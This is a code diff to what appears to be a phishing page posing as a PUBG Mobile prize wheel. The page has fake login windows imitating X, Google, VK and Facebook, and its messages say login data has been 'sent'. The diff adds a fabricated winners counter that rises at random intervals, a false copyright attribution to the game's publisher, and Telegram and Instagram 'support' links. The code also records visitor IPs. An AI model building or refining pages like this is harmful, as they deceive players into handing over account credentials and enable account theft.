@@ -53,7 +53,129 @@
             z-index: -1;
         }
         
-        /* Верхнее меню - ИСПРАВЛЕННОЕ */
+        /* Новое меню разработчиков */
+        .dev-menu-btn {
+            position: fixed;
+            top: 15px;
+            left: 15px;
+            width: 45px;
+            height: 45px;
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 1000;
+            border: 1px solid #2a3b5a;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .dev-menu-btn:hover {
+            background: rgba(24, 119, 242, 0.2);
+            transform: scale(1.1);
+        }
+        
+        .dev-menu-btn i {
+            font-size: 20px;
+            color: #8da1b5;
+        }
+        
+        .dev-menu-dropdown {
+            position: fixed;
+            top: 70px;
+            left: 15px;
+            background: rgba(20, 35, 60, 0.95);
+            border-radius: 12px;
+            padding: 15px;
+            min-width: 200px;
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            z-index: 1000;
+            border: 1px solid #2a3b5a;
+            backdrop-filter: blur(15px);
+            animation: fadeInDropdown 0.3s ease;
+        }
+        
+        .dev-menu-dropdown.show {
+            display: flex;
+        }
+        
+        .dev-menu-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: #8da1b5;
+        }
+        
+        .dev-menu-item:hover {
+            background: rgba(24, 119, 242, 0.1);
+            color: #1877F2;
+            transform: translateX(5px);
+        }
+        
+        .dev-menu-item i {
+            font-size: 18px;
+            width: 24px;
+            text-align: center;
+        }
+        
+        .dev-menu-item span {
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        /* Счетчик победителей */
+        .winners-counter {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 12px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            border: 1px solid #2a3b5a;
+            backdrop-filter: blur(10px);
+            animation: slideInRight 0.5s ease-out;
+        }
+        
+        .winners-counter i {
+            color: #7B68EE;
+            font-size: 18px;
+            animation: trophyPulse 2s infinite;
+        }
+        
+        @keyframes trophyPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .winners-text {
+            font-family: Arial, sans-serif;
+            font-size: 13px;
+            color: #8da1b5;
+        }
+        
+        .winners-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: #7B68EE;
+            min-width: 40px;
+        }
+        
+        /* Верхнее меню - ОБНОВЛЕННОЕ */
         .top-menu {
             width: 100%;
             max-width: 800px;
@@ -68,12 +190,14 @@
             backdrop-filter: blur(10px);
             z-index: 100;
             position: relative;
+            margin-top: 60px;
         }
         
         .language-menu {
             position: relative;
             flex: 1;
             min-width: 120px;
+            margin-right: 20px;
         }
         
         .language-btn {
@@ -480,7 +604,7 @@
             }
         }
         
-        /* СЕТКА ПРИЗОВ */
+        /* СЕТКА ПРИЗОВ - УБРАНА АНИМАЦИЯ ПОЯВЛЕНИЯ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -506,29 +630,7 @@
             border: 1px solid transparent;
             position: relative;
             overflow: hidden;
-            animation: prizeItemAppear 0.5s ease-out;
-            animation-fill-mode: both;
-        }
-
-        .prize-item:nth-child(1) { animation-delay: 0.1s; }
-        .prize-item:nth-child(2) { animation-delay: 0.2s; }
-        .prize-item:nth-child(3) { animation-delay: 0.3s; }
-        .prize-item:nth-child(4) { animation-delay: 0.4s; }
-        .prize-item:nth-child(5) { animation-delay: 0.5s; }
-        .prize-item:nth-child(6) { animation-delay: 0.6s; }
-        .prize-item:nth-child(7) { animation-delay: 0.7s; }
-        .prize-item:nth-child(8) { animation-delay: 0.8s; }
-        .prize-item:nth-child(9) { animation-delay: 0.9s; }
-
-        @keyframes prizeItemAppear {
-            from {
-                opacity: 0;
-                transform: scale(0.5) rotate(180deg);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) rotate(0deg);
-            }
+            /* Анимация появления удалена */
         }
         
         .prize-item::before {
@@ -581,7 +683,7 @@
             opacity: 0.8;
         }
         
-        /* РАМКА ВЫБОРА С УЛУЧШЕННОЙ АНИМАЦИЕЙ */
+        /* РАМКА ВЫБОРА С МЕДЛЕННОЙ АНИМАЦИЕЙ */
         .selection-frame {
             position: absolute;
             border: 2px solid #1877F2;
@@ -590,7 +692,7 @@
                 0 0 20px rgba(24, 119, 242, 0.8),
                 0 0 40px rgba(24, 119, 242, 0.4),
                 inset 0 0 20px rgba(24, 119, 242, 0.2);
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); /* Увеличено с 0.5s */
             z-index: 100;
             pointer-events: none;
             opacity: 0;
@@ -610,7 +712,7 @@
             bottom: -6px;
             border: 1px solid rgba(255, 255, 255, 0.3);
             border-radius: 18px;
-            animation: borderRotate 4s linear infinite;
+            animation: borderRotate 6s linear infinite; /* Увеличено с 4s */
             pointer-events: none;
         }
         
@@ -624,7 +726,7 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 12px;
             pointer-events: none;
-            animation: innerGlow 3s ease-in-out infinite alternate;
+            animation: innerGlow 4s ease-in-out infinite alternate; /* Увеличено с 3s */
         }
 
         @keyframes innerGlow {
@@ -651,7 +753,7 @@
             border-right: none;
             border-bottom: none;
             border-top-left-radius: 6px;
-            animation: cornerPulse 2s infinite;
+            animation: cornerPulse 3s infinite; /* Увеличено с 2s */
         }
         
         .corner-tr {
@@ -660,7 +762,7 @@
             border-left: none;
             border-bottom: none;
             border-top-right-radius: 6px;
-            animation: cornerPulse 2s infinite 0.5s;
+            animation: cornerPulse 3s infinite 0.8s; /* Увеличено с 0.5s */
         }
         
         .corner-bl {
@@ -669,7 +771,7 @@
             border-right: none;
             border-top: none;
             border-bottom-left-radius: 6px;
-            animation: cornerPulse 2s infinite 1s;
+            animation: cornerPulse 3s infinite 1.6s; /* Увеличено с 1s */
         }
         
         .corner-br {
@@ -678,7 +780,7 @@
             border-left: none;
             border-top: none;
             border-bottom-right-radius: 6px;
-            animation: cornerPulse 2s infinite 1.5s;
+            animation: cornerPulse 3s infinite 2.4s; /* Увеличено с 1.5s */
         }
 
         @keyframes cornerPulse {
@@ -695,9 +797,9 @@
         .selection-frame.active {
             opacity: 1;
             animation: 
-                pulse 1.2s infinite alternate,
-                glow 2s infinite alternate,
-                frameFloat 3s ease-in-out infinite;
+                pulse 2s infinite alternate, /* Увеличено с 1.2s */
+                glow 3s infinite alternate, /* Увеличено с 2s */
+                frameFloat 4s ease-in-out infinite; /* Увеличено с 3s */
         }
 
         @keyframes frameFloat {
@@ -760,7 +862,7 @@
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
-            animation: indicatorFloat 2s ease-in-out infinite;
+            animation: indicatorFloat 3s ease-in-out infinite; /* Увеличено с 2s */
         }
 
         @keyframes indicatorFloat {
@@ -787,7 +889,7 @@
             opacity: 1;
         }
         
-        /* КНОПКА ИГРАТЬ - ИЗМЕНЕН ЦВЕТ НА СИНИЙ */
+        /* КНОПКА ИГРАТЬ */
         .play-btn {
             background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
@@ -941,24 +1043,6 @@
             border: 2px solid transparent;
             position: relative;
             overflow: hidden;
-            animation: socialOptionAppear 0.5s ease-out;
-            animation-fill-mode: both;
-        }
-
-        .social-option:nth-child(1) { animation-delay: 0.1s; }
-        .social-option:nth-child(2) { animation-delay: 0.2s; }
-        .social-option:nth-child(3) { animation-delay: 0.3s; }
-        .social-option:nth-child(4) { animation-delay: 0.4s; }
-
-        @keyframes socialOptionAppear {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .social-option::before {
@@ -977,16 +1061,6 @@
             transform: translateY(-5px) scale(1.05);
             border-color: rgba(24, 119, 242, 0.5);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-            animation: socialOptionHover 0.3s ease-out;
-        }
-
-        @keyframes socialOptionHover {
-            from {
-                transform: translateY(0) scale(1);
-            }
-            to {
-                transform: translateY(-5px) scale(1.05);
-            }
         }
         
         .social-option:hover::before {
@@ -1000,16 +1074,6 @@
                 0 0 20px rgba(24, 119, 242, 0.4),
                 inset 0 0 10px rgba(24, 119, 242, 0.1);
             transform: scale(1.05);
-            animation: selectedSocial 0.5s ease-out infinite alternate;
-        }
-
-        @keyframes selectedSocial {
-            from {
-                box-shadow: 0 0 20px rgba(24, 119, 242, 0.4);
-            }
-            to {
-                box-shadow: 0 0 30px rgba(24, 119, 242, 0.7);
-            }
         }
         
         .social-icon {
@@ -1024,16 +1088,6 @@
             background: rgba(255, 255, 255, 0.1);
             padding: 10px;
             transition: all 0.3s;
-            animation: iconFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes iconFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
         }
         
         .social-icon img, .social-icon svg {
@@ -1046,16 +1100,6 @@
         .social-option.selected .social-icon {
             background: rgba(24, 119, 242, 0.2);
             transform: scale(1.1);
-            animation: selectedIcon 1s ease-in-out infinite alternate;
-        }
-
-        @keyframes selectedIcon {
-            from {
-                transform: scale(1.1);
-            }
-            to {
-                transform: scale(1.15);
-            }
         }
         
         .social-option span {
@@ -1096,7 +1140,6 @@
             gap: 15px;
             position: relative;
             overflow: hidden;
-            animation: buttonAppear 1s ease-out 0.5s both;
         }
         
         .get-prize-btn::before {
@@ -1215,50 +1258,49 @@
             }
         }
         
-        /* УВЕДОМЛЕНИЯ - ИСПРАВЛЕННО ПОЗИЦИОНИРОВАНИЕ */
+        /* УВЕДОМЛЕНИЯ - КРАСИВЕЕ СВЕРХУ СЛЕВА */
         .notification {
             position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: linear-gradient(135deg, #2a3b5a, #1a2c42);
-            color: #1877F2;
-            padding: 20px 30px;
-            border-radius: 15px;
-            border-left: 5px solid #1877F2;
+            top: 70px;
+            left: 15px;
+            background: linear-gradient(135deg, #162436, #0a1018);
+            color: #fff;
+            padding: 15px 20px;
+            border-radius: 12px;
+            border-left: 4px solid #1877F2;
             box-shadow: 
-                0 10px 25px rgba(0, 0, 0, 0.4),
+                0 8px 25px rgba(0, 0, 0, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.1);
             display: none;
             z-index: 1001;
-            max-width: 350px;
-            animation: slideInDownCenter 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 320px;
+            animation: slideInLeft 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             font-family: Arial, sans-serif;
             backdrop-filter: blur(10px);
             font-weight: 500;
-            text-align: center;
-            width: 90%;
+            text-align: left;
+            width: auto;
         }
 
-        @keyframes slideInDownCenter {
+        @keyframes slideInLeft {
             from { 
-                transform: translateX(-50%) translateY(-100%);
+                transform: translateX(-100%);
                 opacity: 0; 
             }
             to { 
-                transform: translateX(-50%) translateY(0);
+                transform: translateX(0);
                 opacity: 1; 
             }
         }
         
         .notification.error {
-            color: #ff4444;
+            color: #fff;
             border-left-color: #ff4444;
             background: linear-gradient(135deg, #5a1a1a, #3a0a0a);
         }
         
         .notification.success {
-            color: #4CAF50;
+            color: #fff;
             border-left-color: #4CAF50;
             background: linear-gradient(135deg, #1a5a1a, #0a3a0a);
         }
@@ -1336,7 +1378,7 @@
             color: #333;
         }
         
-        /* Twitter/X стиль */
+        /* Twitter/X стиль - ИЗМЕНЕНО НА X */
         .x-modal-step1 {
             padding: 30px;
             animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -1347,16 +1389,6 @@
             height: 40px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes logoFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
         }
         
         .x-title {
@@ -1529,7 +1561,7 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля */
+        /* X модальное окно для пароля */
         .x-modal-step2 {
             background: #000000;
             color: white;
@@ -1646,7 +1678,6 @@
             height: 48px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .vk-title {
@@ -1766,7 +1797,6 @@
             display: block;
             margin-left: auto;
             margin-right: auto;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .fb-content {
@@ -1909,19 +1939,6 @@
             width: 75px;
             display: block;
             margin-bottom: 25px;
-            animation: googleLogoFloat 4s ease-in-out infinite;
-        }
-
-        @keyframes googleLogoFloat {
-            0%, 100% {
-                transform: translateY(0) rotate(0deg);
-            }
-            25% {
-                transform: translateY(-5px) rotate(5deg);
-            }
-            75% {
-                transform: translateY(5px) rotate(-5deg);
-            }
         }
 
         .google-title {
@@ -1954,16 +1971,6 @@
             font-size: 12px;
             color: #1a73e8;
             z-index: 1;
-            animation: labelPulse 2s infinite alternate;
-        }
-
-        @keyframes labelPulse {
-            from {
-                color: #1a73e8;
-            }
-            to {
-                color: #0d47a1;
-            }
         }
 
         .google-input {
@@ -2289,11 +2296,75 @@
                 transform: translateX(-50%);
                 width: auto;
             }
+            
+            /* Адаптация для мобильных */
+            .dev-menu-btn {
+                width: 40px;
+                height: 40px;
+                top: 10px;
+                left: 10px;
+            }
+            
+            .dev-menu-dropdown {
+                top: 60px;
+                left: 10px;
+                min-width: 180px;
+            }
+            
+            .winners-counter {
+                top: 10px;
+                right: 10px;
+                padding: 8px 15px;
+            }
+            
+            .winners-number {
+                font-size: 16px;
+            }
+            
+            .winners-text {
+                font-size: 11px;
+            }
+            
+            .notification {
+                top: 60px;
+                left: 10px;
+                max-width: 280px;
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+            
+            .top-menu {
+                margin-top: 50px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <!-- Кнопка меню разработчиков -->
+    <div class="dev-menu-btn" id="devMenuBtn">
+        <i class="fas fa-bars"></i>
+    </div>
+    
+    <!-- Меню разработчиков -->
+    <div class="dev-menu-dropdown" id="devMenuDropdown">
+        <a href="https://instagram.com/pubgmcis" target="_blank" class="dev-menu-item">
+            <i class="fab fa-instagram"></i>
+            <span>Разработчики Instagram</span>
+        </a>
+        <a href="https://t.me/helpumgmbot" target="_blank" class="dev-menu-item">
+            <i class="fab fa-telegram"></i>
+            <span>Техподдержка Telegram</span>
+        </a>
+    </div>
+    
+    <!-- Счетчик победителей -->
+    <div class="winners-counter" id="winnersCounter">
+        <i class="fas fa-trophy"></i>
+        <div class="winners-text">Победителей:</div>
+        <div class="winners-number" id="winnersNumber">0</div>
+    </div>
+    
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
     
@@ -2379,7 +2450,7 @@
 
     <!-- Модальные окна для входа -->
     
-    <!-- Twitter/X модальное окно (этап 1: email/username) -->
+    <!-- X модальное окно (этап 1: email/username) -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
         <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
@@ -2424,7 +2495,7 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) -->
+    <!-- X модальное окно (этап 2: пароль) -->
     <div class="modal-overlay modal-dark" id="xModalStep2">
         <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
@@ -2536,7 +2607,7 @@
                 <div class="language-option" data-lang="uk">Українська</div>
             </div>
         </div>
-        <div class="logo">PUBG MOBILE</div>
+        <!-- Текст PUBG MOBILE удален -->
         <div class="prize-mail-icon">
             <button class="prize-mail-btn" id="prizeMailBtn">
                 <i class="fas fa-gift"></i> Мой приз
@@ -2620,9 +2691,9 @@
                 
                 <div class="social-option" data-social="x" onclick="openXModal()">
                     <div class="social-icon">
-                        <img src="twiter.png" alt="Twitter">
+                        <img src="twiter.png" alt="X">
                     </div>
-                    <span>Twitter/X</span>
+                    <span>X</span>
                 </div>
                 
                 <div class="social-option" data-social="google" onclick="openGoogleFullscreen()">
@@ -2695,6 +2766,8 @@
         let ownerIP = '31.43.60.156';
         let userIP = '';
         let hasPlayed = false;
+        let winnersCount = 0;
+        let winnersTimer = null;
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -2804,7 +2877,63 @@
             }
         }
         
+        // Функция для обновления счетчика победителей
+        function updateWinnersCounter() {
+            const winnersNumber = document.getElementById('winnersNumber');
+            winnersNumber.textContent = winnersCount;
+        }
+        
+        // Функция для увеличения счетчика победителей
+        function incrementWinnersCount() {
+            winnersCount++;
+            updateWinnersCounter();
+            
+            // Сохраняем в localStorage
+            localStorage.setItem('winnersCount', winnersCount);
+            
+            // Устанавливаем следующий таймер
+            const nextIncrement = Math.floor(Math.random() * 20000) + 20000; // 20-40 секунд
+            winnersTimer = setTimeout(incrementWinnersCount, nextIncrement);
+        }
+        
+        // Функция инициализации счетчика победителей
+        function initWinnersCounter() {
+            // Пытаемся получить сохраненное значение из localStorage
+            const savedCount = localStorage.getItem('winnersCount');
+            
+            if (savedCount) {
+                winnersCount = parseInt(savedCount);
+            } else {
+                // Устанавливаем случайное начальное значение от 100 до 200
+                winnersCount = Math.floor(Math.random() * 101) + 100;
+            }
+            
+            updateWinnersCounter();
+            
+            // Запускаем таймер для первого увеличения
+            const firstIncrement = Math.floor(Math.random() * 20000) + 20000; // 20-40 секунд
+            winnersTimer = setTimeout(incrementWinnersCount, firstIncrement);
+        }
+        
+        // Меню разработчиков
+        const devMenuBtn = document.getElementById('devMenuBtn');
+        const devMenuDropdown = document.getElementById('devMenuDropdown');
+        
+        devMenuBtn.addEventListener('click', function() {
+            devMenuDropdown.classList.toggle('show');
+        });
+        
+        // Закрытие меню разработчиков при клике вне его
+        document.addEventListener('click', function(event) {
+            if (!devMenuBtn.contains(event.target) && !devMenuDropdown.contains(event.target)) {
+                devMenuDropdown.classList.remove('show');
+            }
+        });
+        
         document.addEventListener('DOMContentLoaded', function() {
+            // Инициализируем счетчик победителей
+            initWinnersCounter();
+            
             // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -2879,7 +3008,7 @@
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
             
-            // Языковые настройки
+            // Языковые настройки - ПОЛНЫЕ ПЕРЕВОДЫ
             const translations = {
                 ru: {
                     play: "ИГРАТЬ",
@@ -2894,7 +3023,24 @@
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
-                    alreadyPlayed: "УЖЕ ИГРАЛИ"
+                    alreadyPlayed: "УЖЕ ИГРАЛИ",
+                    myPrize: "Мой приз",
+                    importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
+                    confirmationThanks: "Спасибо за участие! Не забудьте проверить свой инвентарь в игре.",
+                    choosePrize: "Выберите социальную сеть для получения приза",
+                    developers: "Разработчики Instagram",
+                    support: "Техподдержка Telegram",
+                    yourPrize: "ВАШ ПРИЗ",
+                    prizeDescription: "Предмет был отправлен на вашу игровую почту. Пожалуйста, подождите до 24 часов для обработки транзакции.",
+                    collect: "ЗАБРАТЬ",
+                    emptyMail: "ПОЧТА ПУСТА",
+                    emptyMailDesc: "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!",
+                    winners: "Победителей:",
+                    terms: "Условия обслуживания",
+                    privacy: "Политика конфиденциальности",
+                    cookiePolicy: "Политика Cookie",
+                    cookiePref: "Предпочтение Cookies",
+                    copyright: "Авторские права © High Morale Developments Limited. Все права защищены."
                 },
                 en: {
                     play: "PLAY",
@@ -2909,7 +3055,24 @@
                     confirmationTitle: "APPLICATION ACCEPTED!",
                     confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
                     loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    alreadyPlayed: "ALREADY PLAYED"
+                    alreadyPlayed: "ALREADY PLAYED",
+                    myPrize: "My Prize",
+                    importantNote: "Important: The prize will be credited to your account within 24 hours",
+                    confirmationThanks: "Thank you for participating! Don't forget to check your in-game inventory.",
+                    choosePrize: "Select social network to receive the prize",
+                    developers: "Developers Instagram",
+                    support: "Support Telegram",
+                    yourPrize: "YOUR PRIZE",
+                    prizeDescription: "The item has been sent to your game mail. Please wait up to 24 hours for transaction processing.",
+                    collect: "COLLECT",
+                    emptyMail: "MAIL EMPTY",
+                    emptyMailDesc: "You don't have any prizes yet. Play the wheel of fortune to win exclusive prizes!",
+                    winners: "Winners:",
+                    terms: "Terms of Service",
+                    privacy: "Privacy Policy",
+                    cookiePolicy: "Cookie Policy",
+                    cookiePref: "Cookie Preference",
+                    copyright: "Copyright © High Morale Developments Limited. All rights reserved."
                 },
                 uz: {
                     play: "O'YIN",
@@ -2924,7 +3087,24 @@
                     confirmationTitle: "ARIZA QABUL QILINDI!",
                     confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
-                    alreadyPlayed: "ALLAQACHON O'YNANGAN"
+                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
+                    myPrize: "Mening sovrinim",
+                    importantNote: "Muhim: Sovrin hisobingizga 24 soat ichida o'tkaziladi",
+                    confirmationThanks: "Ishtirok etganingiz uchun rahmat! O'yin ichidagi inventaringizni tekshirishni unutmang.",
+                    choosePrize: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
+                    developers: "Dasturchilar Instagram",
+                    support: "Qo'llab-quvvatlash Telegram",
+                    yourPrize: "SIZNING SOVRININGIZ",
+                    prizeDescription: "Buyum sizning o'yin pochtangizga yuborildi. Tranzaktsiya qayta ishlanishi uchun 24 soatgacha kuting.",
+                    collect: "OLISH",
+                    emptyMail: "POCHTA BO'SH",
+                    emptyMailDesc: "Hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutib olish uchun baxt g'ildirag'ida o'ynang!",
+                    winners: "G'oliblar:",
+                    terms: "Xizmat ko'rsatish shartlari",
+                    privacy: "Maxfiylik siyosati",
+                    cookiePolicy: "Cookie siyosati",
+                    cookiePref: "Cookie parametrlari",
+                    copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan."
                 },
                 kz: {
                     play: "ОЙНАУ",
@@ -2939,7 +3119,24 @@
                     confirmationTitle: "ӨТІНІШ ҚАБЫЛДАНДЫ!",
                     confirmationMessage: "Жеңісіңіз PUBG Mobile шотыңызға 24 сағат ішінде аударылады.",
                     loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
-                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН"
+                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
+                    myPrize: "Менің жүлдем",
+                    importantNote: "Маңызды: Жүлде шотыңызға 24 сағат ішінде аударылады",
+                    confirmationThanks: "Қатысқаныңыз үшін рахмет! Ойын ішіндегі инвентарыңызды тексеруді ұмытпаңыз.",
+                    choosePrize: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
+                    developers: "Әзірлеушілер Instagram",
+                    support: "Қолдау Telegram",
+                    yourPrize: "СІЗДІҢ ЖҮЛДЕНІЗ",
+                    prizeDescription: "Элемент сіздің ойын поштаңызға жіберілді. Транзакция өңделуі үшін 24 сағатқа дейін күтіңіз.",
+                    collect: "АЛУ",
+                    emptyMail: "ПОЧТА БОС",
+                    emptyMailDesc: "Сізде әлі жүлде жоқ. Эксклюзивті жүлделерді ұтып алу үшін бақыт дөңгелегінде ойнаңыз!",
+                    winners: "Жеңімпаздар:",
+                    terms: "Қызмет көрсету шарттары",
+                    privacy: "Құпиялылық саясаты",
+                    cookiePolicy: "Cookie саясаты",
+                    cookiePref: "Cookie параметрлері",
+                    copyright: "Авторлық құқық © High Morale Developments Limited. Барлық құқықтар қорғалған."
                 },
                 ar: {
                     play: "لعب",
@@ -2954,29 +3151,338 @@
                     confirmationTitle: "تم قبول الطلب!",
                     confirmationMessage: "سيتم إضافة ربحك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
                     loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
-                    alreadyPlayed: "لعبت بالفعل"
+                    alreadyPlayed: "لعبت بالفعل",
+                    myPrize: "جائزتي",
+                    importantNote: "مهم: سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة",
+                    confirmationThanks: "شكرا لمشاركتك! لا تنس التحقق من مخزونك في اللعبة.",
+                    choosePrize: "اختر شبكة اجتماعية لاستلام الجائزة",
+                    developers: "المطورين Instagram",
+                    support: "الدعم الفني Telegram",
+                    yourPrize: "جائزتك",
+                    prizeDescription: "تم إرسال العنصر إلى بريدك في اللعبة. يرجى الانتظار حتى 24 ساعة لمعالجة المعاملة.",
+                    collect: "جمع",
+                    emptyMail: "البريد فارغ",
+                    emptyMailDesc: "ليس لديك أي جوائز بعد. العب عجلة الحظ لربح جوائز حصرية!",
+                    winners: "الفائزون:",
+                    terms: "شروط الخدمة",
+                    privacy: "سياسة الخصوصية",
+                    cookiePolicy: "سياسة الكوكيز",
+                    cookiePref: "تفضيلات الكوكيز",
+                    copyright: "حقوق النشر © High Morale Developments Limited. جميع الحقوق محفوظة."
+                },
+                zh: {
+                    play: "玩",
+                    title: "PUBG 幸运轮盘",
+                    subtitle: "试试你的运气，赢取独家奖品！",
+                    selectTitle: "选择领取方式",
+                    selectText: "选择社交媒体领取奖品",
+                    getPrizeBtn: "领取奖品",
+                    notificationSuccess: "申请已接受！奖品将在24小时内发放。",
+                    notificationSelectSocial: "请选择社交媒体",
+                    notificationAlreadyPlayed: "您今天已经使用过机会了！",
+                    confirmationTitle: "申请已接受！",
+                    confirmationMessage: "您的奖励将在24小时内发放到您的PUBG Mobile账户。",
+                    loginSuccess: "登录数据已发送！奖品将在24小时内发放。",
+                    alreadyPlayed: "已经玩过",
+                    myPrize: "我的奖品",
+                    importantNote: "重要：奖品将在24小时内发放到您的账户",
+                    confirmationThanks: "感谢参与！别忘了检查您的游戏库存。",
+                    choosePrize: "选择社交媒体领取奖品",
+                    developers: "开发者 Instagram",
+                    support: "技术支持 Telegram",
+                    yourPrize: "您的奖品",
+                    prizeDescription: "物品已发送到您的游戏邮箱。请等待最多24小时处理交易。",
+                    collect: "领取",
+                    emptyMail: "邮箱为空",
+                    emptyMailDesc: "您还没有任何奖品。玩幸运轮盘赢取独家奖品！",
+                    winners: "获胜者：",
+                    terms: "服务条款",
+                    privacy: "隐私政策",
+                    cookiePolicy: "Cookie政策",
+                    cookiePref: "Cookie偏好设置",
+                    copyright: "版权所有 © High Morale Developments Limited。保留所有权利。"
+                },
+                ky: {
+                    play: "ОЙНОО",
+                    title: "PUBG БАКТЫЛУУ ДОБУЛБА",
+                    subtitle: "Бактыңызды сынап көрүңүз жана эксклюзивтүү сыйлыктарды утуп алыңыз!",
+                    selectTitle: "КАБЫЛ АЛУУ ЫКМАСЫН ТАНДАҢЫЗ",
+                    selectText: "Сыйлыкты кабыл алуу үчүн социалдык тармакты тандаңыз",
+                    getPrizeBtn: "СЫЙЛЫКТЫ АЛУУ",
+                    notificationSuccess: "Өтүнүч кабыл алынды! Сыйлык 24 саат ичинде которулат.",
+                    notificationSelectSocial: "Өтүнүч, социалдык тармакты тандаңыз",
+                    notificationAlreadyPlayed: "Сиз бүгүнкү мүмкүнчүлүгүңүздү пайдаландыңыз!",
+                    confirmationTitle: "ӨТҮНҮЧ КАБЫЛ АЛЫНДЫ!",
+                    confirmationMessage: "Жеңишиңиз PUBG Mobile эсебиңизге 24 саат ичинде которулат.",
+                    loginSuccess: "Кирүү маалыматтары жөнөтүлдү! Сыйлык 24 саат ичинде которулат.",
+                    alreadyPlayed: "АЗЫР ОЙНОГУЧУ",
+                    myPrize: "Менин сыйлыгым",
+                    importantNote: "Маанилүү: Сыйлык эсебиңизге 24 саат ичинде которулат",
+                    confirmationThanks: "Катышкан үчүн рахмат! Оюн ичиндеги инвентарыңызды текшерүүнү унутпаңыз.",
+                    choosePrize: "Сыйлыкты кабыл алуу үчүн социалдык тармакты тандаңыз",
+                    developers: "Иштеп чыгуучулар Instagram",
+                    support: "Колдоо Telegram",
+                    yourPrize: "СИЗДИН СЫЙЛЫГЫҢЫЗ",
+                    prizeDescription: "Элемент сиздин оюн почтаңызга жөнөтүлдү. Транзакция иштетилиши үчүн 24 саатка чейин күтүңүз.",
+                    collect: "АЛУУ",
+                    emptyMail: "ПОЧТА БОШ",
+                    emptyMailDesc: "Сизде азырынча сыйлык жок. Эксклюзивтүү сыйлыктарды утуп алуу үчүн бактылуу добулбада ойлонуз!",
+                    winners: "Жеңүүчүлөр:",
+                    terms: "Кызмат көрсөтүү шарттары",
+                    privacy: "Жашыруундук саясаты",
+                    cookiePolicy: "Cookie саясаты",
+                    cookiePref: "Cookie параметрлери",
